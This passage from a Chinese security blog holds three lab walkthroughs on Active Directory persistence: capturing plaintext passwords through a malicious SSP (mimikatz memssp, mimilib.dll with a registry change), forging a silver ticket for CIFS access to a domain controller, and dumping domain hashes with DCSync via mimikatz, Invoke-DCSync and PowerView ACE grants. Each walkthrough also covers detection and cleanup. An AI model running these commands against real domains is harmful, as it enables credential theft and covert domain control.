<p><strong>功能：</strong>在登录的过程中获取用户的明文密码并存储在system32的mimilsa.log中。此攻击不会在二进制系统中留下二进制文件，一旦域控重启，注入代码就会失效。</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/5.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>

<p>当<strong>系统重启</strong>再次进行身份验证的时候，会在System32目录下创建mimilsa.log</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/4.png"></p>
<h1 id="0x03-SSP中加载mimilib-dll"><a href="#0x03-SSP中加载mimilib-dll" class="headerlink" title="0x03 SSP中加载mimilib.dll"></a>0x03 SSP中加载mimilib.dll</h1><p><strong>原理：</strong>mimikatz自带mimilib.dll也实现了SSP功能，mimikatz利用AddSecurityPackage此API来加载SSP，可在不重启的情况下添加mimilib.dll。</p>
<p>该dll包含SpLsaModelntialize导出函数，lsass.exe会使用该函数来初始化包含多个回调函数的一个结构体，其中回调函数SpAcceptCredentials用来接收LSA传递的明文凭据</p>
<h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2><h3 id="添加SSP"><a href="#添加SSP" class="headerlink" title="添加SSP"></a>添加SSP</h3><p>将mimikatz提供的mimilib.dll复制到c:\windows\system32，与lsass进程位置相同，以便获取访问受感染主机的任何用户的登陆凭证</p>
<h3 id="设置SSP"><a href="#设置SSP" class="headerlink" title="设置SSP"></a>设置SSP</h3><p>修改DC注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#修改注册表项</span><br><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; &#x2F;v &quot;Security Packages&quot; &#x2F;d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; &#x2F;t REG_MULTI_SZ</span><br><span class="line">#查看注册表项是否注入恶意dll</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/2.png"></p>
<p>重启系统，当域用户再次进行身份验证时-锁屏并打开，将System32目录下创建kiwissp文件，记录用户账户及明文密码</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/3.png"></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><ul>
<li>加载到内存：必须重新登录，重新启动后不会存在</li>
<li>ssp中加载dll：必须重启，永久有效</li>
</ul>
<h1 id="0x05-检测及清理"><a href="#0x05-检测及清理" class="headerlink" title="0x05 检测及清理"></a>0x05 检测及清理</h1><h2 id="1-检测"><a href="#1-检测" class="headerlink" title="1.检测"></a>1.检测</h2><h3 id="memssp"><a href="#memssp" class="headerlink" title="memssp:"></a>memssp:</h3><ul>
<li><p>只能通过sysmon监控到mimilsa.log创建的日志</p>
<p>sysmon检测创建文件事件-事件11</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/6.png"></p>
</li>
</ul>
<h3 id="SSP中加载mimilib-dll："><a href="#SSP中加载mimilib-dll：" class="headerlink" title="SSP中加载mimilib.dll："></a>SSP中加载mimilib.dll：</h3><ul>
<li><p>sysmon4622事件：记录了lsass进程加载mimilib的过程</p>
</li>
<li><p>sysmon11事件：mimilib落盘</p>
</li>
<li><p>sysmon13事件：注册表修改</p>
</li>
<li><p>sysmon7事件：dll加载</p>
</li>
</ul>
<h2 id="2-防御清除："><a href="#2-防御清除：" class="headerlink" title="2.防御清除："></a>2.防御清除：</h2><h3 id="memssp-1"><a href="#memssp-1" class="headerlink" title="memssp:"></a>memssp:</h3><ul>
<li>查看Windows\System32下是否有mimilsa.log文件</li>
<li>使用ARK工具查看msv1_0.dll是否已经被inlinehook(修改函数体实现)</li>
</ul>
<h3 id="mimilib-dll加载"><a href="#mimilib-dll加载" class="headerlink" title="mimilib.dll加载:"></a>mimilib.dll加载:</h3><ul>
<li>检测此位置是否加载恶意dll</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\ </span><br></pre></td></tr></table></figure>

<ul>
<li>检测Windows\System32是否有kiwissp.log</li>
</ul>
<p>Autoruns可用来检测LSA，报告出dll的位置</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><p>创建的域用户本身拥有登录权限。登录用户名记得是<strong>域名\创建用户名</strong></p>
</li>
<li><p>winver查看系统版本</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/0.png"></p>
</li>
<li><p>ARK：<a target="_blank" rel="noopener" href="https://openark.blackint3.com/">https://openark.blackint3.com/</a></p>
</li>
<li><p>主要参考：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://yanmie-art.github.io/2021/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">https://yanmie-art.github.io/2021/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/11834327.html">https://www.cnblogs.com/xiaozi/p/11834327.html</a></p>
</li>
<li><p>sysmon:<a target="_blank" rel="noopener" href="https://www.sysgeek.cn/sysmon/">https://www.sysgeek.cn/sysmon/</a></p>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/" class="post-title-link" itemprop="url">域渗透维权之银票</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-08 18:16:08" itemprop="dateCreated datePublished" datetime="2021-07-08T18:16:08+08:00">2021-07-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-14 10:44:44" itemprop="dateModified" datetime="2021-07-14T10:44:44+08:00">2021-07-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>利用PTT票据传递攻击，就可以替代明文密码。PTT包括金票和银票利用</p>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>白银票据用来伪造ST。我们实验利用白银票据提升普通用户的条件、利用方式及检测攻击方式介绍如下</p>
<table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">192.168.221.139</td>
<td align="center">DC</td>
</tr>
<tr>
<td align="center">192.168.221.140</td>
<td align="center">域成员</td>
</tr>
</tbody></table>
<h1 id="0x02票据生成条件"><a href="#0x02票据生成条件" class="headerlink" title="0x02票据生成条件"></a>0x02票据生成条件</h1><ul>
<li><p>域名 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/2.png"></p>
</li>
<li><p>域SID</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;user</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/0.png"></p>
</li>
<li><p>需要目标server的NTLM-hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1og.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/5.png"></p>
<blockquote>
<p>windows居然可以支持cat哎，太感动了</p>
</blockquote>
</li>
<li><p>伪造任意用户名给予某服务权限</p>
</li>
</ul>
<h1 id="0x03-票据伪造及利用："><a href="#0x03-票据伪造及利用：" class="headerlink" title="0x03 票据伪造及利用："></a>0x03 票据伪造及利用：</h1><p>生成票据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::gloden &#x2F;user:swanq &#x2F;domain:wlaq.com &#x2F;sid:S-1-5-21-160213220-343523822-3012469542</span><br><span class="line">&#x2F;rc4:44fc74f5b9978830e7ec7dbd66cb4324 &#x2F;target:WIN-2019-DC.wlaq.com &#x2F;service:cifs  &#x2F;ptt </span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/7.png"></p>
<p>此时会成功开启cifs服务的白银票据，即可访问域控主机的共享目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-2019-DC\c$</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/8.png"></p>
<blockquote>
<p>为普通域用户增加某计算机的登录权限：AC中某user-&gt;右键属性-&gt;账户-&gt;登录到-&gt;下列计算机-&gt;键入计算机名即可</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看计算机名&#x2F;主机名：hostname</span><br><span class="line">验证某计算机是否位于特定于：nltest &#x2F;dsgetdc:wlaq</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/4.png"></p>
<h1 id="0x04-检测及清理"><a href="#0x04-检测及清理" class="headerlink" title="0x04 检测及清理"></a>0x04 检测及清理</h1><h2 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h2><p>请求域控ntlm-hash日志记录如下，注意到在申请ntlm hash时会产生此异地申请hash地址(其中域控IP为139)。</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/9.png"></p>
<p>kerberos</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/10.png"></p>
<p>此攻击与域控无AS-REQ 、AS-REP通信，也无TGS-REQ / TGS-REP通信。所有的事件日志都在目标服务器上，所以银票的检测比金票更加困难。但是可以通过查看4624的登陆日志，<strong>查看IpAddress选项处的IP是否常用</strong>及<strong>用户和请求的SID是否匹配</strong>来进行检测。同时<strong>结合后续攻击行为</strong>来判断域内主机是否失陷。</p>
<h2 id="清除："><a href="#清除：" class="headerlink" title="清除："></a>清除：</h2><p>银票使用的是server的哈希，存储于存储域中所有用户的密码哈希的KDC密钥分发中心中。</p>
<ul>
<li>默认情况下，加入域的账户密码每30天更新一次，如果受到攻击，与krbtgt账户相同，需要连续修改两次才可防止再次利用。修改时与金票相同，利用脚本来重置两次密码<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1%E3%80%82%E6%88%96%E7%94%A8netdom%E5%91%BD%E4%BB%A4%E6%9D%A5%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E4%BB%A5%E9%98%B2%E5%9F%9F%E5%86%85%E5%B7%A5%E4%BD%9C%E4%B8%8D%E6%AD%A3%E5%B8%B8">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1。或用netdom命令来重置密码以防域内工作不正常</a></li>
<li>修改为永久不修改密码时，只需将HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\ Parameters\DisablePasswordChange注册表键值改为１。</li>
</ul>
<p>作为使得白银票据持久化的方式，此注册表的键值可用来长期监控以防银票攻击。</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></li>
<li><a target="_blank" rel="noopener" href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/#2-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket">https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/#2-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket</a></li>
<li>NTLM-hash：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/0d4y/p/12805112.html">https://www.cnblogs.com/0d4y/p/12805112.html</a></li>
<li>mimkatz官方参考：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html">https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/" class="post-title-link" itemprop="url">域渗透提权维权之dcsync</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-08 10:20:47" itemprop="dateCreated datePublished" datetime="2021-07-08T10:20:47+08:00">2021-07-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-14 10:45:00" itemprop="dateModified" datetime="2021-07-14T10:45:00+08:00">2021-07-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>DCSync是mimikatz的功能/命令。dcsync特点在于不用登录服务器，就可以<strong>远程通过域数据同步复制的方式模仿域控从真实的域控当中请求数据获得想要的用户hash</strong></p>
<h1 id="0x02-dump-hash"><a href="#0x02-dump-hash" class="headerlink" title="0x02 dump hash"></a>0x02 dump hash</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><p>有以下任意用户权限即可：</p>
<ul>
<li>Domain Admins组内的用户</li>
<li>Administrators组内的用户</li>
<li>Enterprise Admins组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控复制用户凭据 ？？</p>
<p>实现代码：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</a></p>
<h2 id="维权方法："><a href="#维权方法：" class="headerlink" title="维权方法："></a>维权方法：</h2><ol>
<li><p>mimikatz</p>
<p>如上上篇博客所写</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导出所有用户hash</span></span><br><span class="line">lsadump::dcsync /domain:wlaq.com /all /csv</span><br><span class="line"><span class="comment">#导出administrator的hash</span></span><br><span class="line">lsadump::dcsync /domain:wlaq.com /user:administrator /csv</span><br></pre></td></tr></table></figure></li>
<li><p>powershell(对2012及以上不适用)</p>
<p>Invoke-DCSync:</p>
<p>\使用mimikatz的dcsync来收集域用户的hash,通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先更改powershell的执行策略</span></span><br><span class="line"><span class="built_in">set-executionpolicy</span> bypass <span class="literal">-scope</span> <span class="keyword">process</span></span><br><span class="line"><span class="comment">#导出域内所有用户的hash：</span></span><br><span class="line"><span class="built_in">Invoke-DCSync</span> <span class="literal">-DumpForest</span> | <span class="built_in">ft</span> <span class="literal">-wrap</span> <span class="literal">-autosize</span></span><br><span class="line"><span class="comment">#导出域内administrator帐户的hash：</span></span><br><span class="line"><span class="built_in">Invoke-DCSync</span> <span class="literal">-DumpForest</span> <span class="literal">-Users</span> <span class="selector-tag">@</span>(<span class="string">&quot;administrator&quot;</span>) | <span class="built_in">ft</span> <span class="literal">-wrap</span> <span class="literal">-autosize</span> </span><br></pre></td></tr></table></figure>

<p>powerview:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</a></p>
<p>利用powerview可向域内的一个普通用户添加如下三条ACE(Access Control Entries)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</span><br><span class="line">DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</span><br><span class="line">DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c) </span><br></pre></td></tr></table></figure>

<p>经过实验，添加前两条即可</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入powerview</span></span><br><span class="line"><span class="built_in">import-module</span> .\Powerview.ps1</span><br><span class="line"><span class="comment">#向普通用户test添加上面三条ACE-acess control entries</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=wlaq,DC=com&quot;</span> <span class="literal">-PrincipalIdentity</span> test <span class="literal">-Rights</span> DCSync <span class="literal">-Verbose</span></span><br><span class="line"><span class="comment">#删除ACE命令</span></span><br><span class="line"><span class="built_in">Remove-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=wlaq,DC=com&quot;</span> <span class="literal">-PrincipalIdentity</span> test <span class="literal">-Rights</span> DCSync <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/1.png"></p>
<p>此时test用户即可利用DCSync来导出域内账户的hash,实现如下：</p>
</li>
</ol>
<h2 id="利用powerview获取用户权限"><a href="#利用powerview获取用户权限" class="headerlink" title="利用powerview获取用户权限"></a>利用powerview获取用户权限</h2><p>利用powerview向域内普通账户swanq添加三个访问控制项</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/1.png"></p>
<p>使用runas登录swanq账户</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/3.png"></p>
<p>使用mimikatz dump hash:</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/2.png"></p>
<h1 id="0x03检测及清理"><a href="#0x03检测及清理" class="headerlink" title="0x03检测及清理"></a>0x03检测及清理</h1><h2 id="检测："><a href="#检测：" class="headerlink" title="检测："></a><strong>检测：</strong></h2><p>注意windows事件：4662.</p>
<p>此时域成员与终端上都产生了两条ACE被添加的事件日志</p>
<h2 id="清理："><a href="#清理：" class="headerlink" title="清理："></a><strong>清理：</strong></h2><p>使用zbang自动化检测当前环境是否遭受dcsync攻击：ACLight -&gt;launch</p>
<p>ACLight可以检测出被添加DCSync权限的用户swanq</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/4.png"></p>
<h3 id="检测原理："><a href="#检测原理：" class="headerlink" title="检测原理："></a><strong>检测原理：</strong></h3><p><strong>枚举Active Directory中所有用户的ACL，标记出特权账户</strong></p>
<p>如果已被攻击，powerview清除ACE,参考0x02部分内容</p>
<h1 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h1><ol>
<li><p>Shadow Admin：具有高权限但不在高权限组的用户，如实验中的域用户swanq，查询高权限组的成员无法发现域内的Shadow Admin,但是zbang可以发现。</p>
</li>
<li><p>ACL和ACE的区别：</p>
<ul>
<li>Access Control Lists访问控制列表：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists</a></li>
<li>Access Control Entities访问控制项：访问控制列表 (ACL) 中的条目。 ACE 包含一组访问权限和安全标识符 (SID) ，后者标识允许、拒绝或审核其权限的账户或登录会话。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-entries">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-entries</a></li>
</ul>
<p>总结：ACL的多个ACE表示拥有不同访问权限的账户或登录会话。通过使用ACE的访问控制项来授予AD域服务中资源的访问权限</p>
</li>
<li><p>账户：</p>
<ul>
<li>用户账户可以登录到本机计算机</li>
<li>组用户不可</li>
</ul>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>主要参考：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync</a></li>
<li>附属：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/111686683">https://blog.csdn.net/qq_41874930/article/details/111686683</a></li>
<li>工具：<a target="_blank" rel="noopener" href="https://github.com/cyberark/zBang/releases/tag/v1.1">https://github.com/cyberark/zBang/releases/tag/v1.1</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=aSAZzIqGeiY">https://www.youtube.com/watch?v=aSAZzIqGeiY</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
